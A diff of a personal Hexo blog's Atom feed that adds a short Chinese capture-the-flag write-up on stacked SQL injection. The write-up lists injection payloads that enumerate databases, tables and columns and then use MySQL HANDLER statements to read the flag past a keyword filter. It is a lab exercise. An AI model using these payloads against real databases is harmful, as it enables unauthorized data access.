@@ -6,7 +6,7 @@
   <link href="http://cxdshibaba.github.io/atom.xml" rel="self"/>
   
   <link href="http://cxdshibaba.github.io/"/>
-  <updated>2022-04-10T07:16:27.593Z</updated>
+  <updated>2022-04-12T11:35:14.790Z</updated>
   <id>http://cxdshibaba.github.io/</id>
   
   <author>
@@ -15,6 +15,26 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>堆叠注入</title>
+    <link href="http://cxdshibaba.github.io/2022/04/12/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/"/>
+    <id>http://cxdshibaba.github.io/2022/04/12/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/</id>
+    <published>2022-04-12T11:14:35.000Z</published>
+    <updated>2022-04-12T11:35:14.790Z</updated>
+    
+    <content type="html"><![CDATA[<p>首先发现题目过滤了以下关键字<br><img src="https://i.bmp.ovh/imgs/2022/04/12/f29ffb1c7f8e97de.png"><br>接下来尝试堆叠注入<br>查库：1’;show databases;–+<br><img src="https://i.bmp.ovh/imgs/2022/04/12/1d9547a6d4887d65.png"><br>查表：1’;show tables;–+<br><img src="https://s3.bmp.ovh/imgs/2022/04/12/a9578ab6c1a29a49.png"><br>分别查两个字段<br>1’; show columns from <code>1919810931114514</code> ;–+<br>1’; show columns from words ;–+<br>在1919810931114514中发现flag<br><img src="https://s3.bmp.ovh/imgs/2022/04/12/d94cb4e686054ad0.png"><br>接着可采取handler语句取flag<br>1’;handler <code>1919810931114514</code> open;handler <code>1919810931114514</code> read first;–+<br><img src="https://s3.bmp.ovh/imgs/2022/04/12/7ca5ac3abc251cf2.png"></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;首先发现题目过滤了以下关键字&lt;br&gt;&lt;img src=&quot;https://i.bmp.ovh/imgs/2022/04/12/f29ffb1c7f8e97de.png&quot;&gt;&lt;br&gt;接下来尝试堆叠注入&lt;br&gt;查库：1’;show databases;–+&lt;br&gt;&lt;img src=</summary>
+      
+    
+    
+    
+    
+  </entry>
   
   <entry>
     <title>解zip伪加密</title>
